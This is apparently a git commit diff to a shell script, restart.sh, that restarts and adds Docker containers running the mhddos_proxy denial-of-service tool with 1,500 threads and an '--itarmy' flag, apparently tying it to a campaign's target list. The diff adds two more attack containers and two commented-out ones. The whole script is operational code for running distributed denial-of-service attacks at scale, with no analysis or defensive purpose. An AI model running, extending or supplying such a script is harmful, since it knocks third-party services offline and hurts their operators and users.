62e8d598a198531f63fea8a56586c39f530fbd95
ch <ch@templatemonster.me>
2022-05-05 09:37:01 +0300

    Fixed restart

--- restart.sh
+++ restart.sh
@@ -9,9 +9,21 @@ docker run -it -d --rm --name=mhddos --pull always ghcr.io/porthole-ascend-cinna
 docker stop $(docker ps -a -q --filter="name=mhddos1")
 docker run -it -d --rm --name=mhddos1 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy
 
-
 docker stop $(docker ps -a -q --filter="name=mhddos2")
 docker run -it -d --rm --name=mhddos2 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy
 
 docker stop $(docker ps -a -q --filter="name=mhddos3")
 docker run -it -d --rm --name=mhddos3 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy
+
+docker stop $(docker ps -a -q --filter="name=mhddos4")
+docker run -it -d --rm --name=mhddos4 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy
+
+
+docker stop $(docker ps -a -q --filter="name=mhddos5")
+docker run -it -d --rm --name=mhddos5 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy
+
+#docker stop $(docker ps -a -q --filter="name=mhddos6")
+#docker run -it -d --rm --name=mhddos6 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy
+
+#docker stop $(docker ps -a -q --filter="name=mhddos7")
+#docker run -it -d --rm --name=mhddos7 --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1500 --itarmy
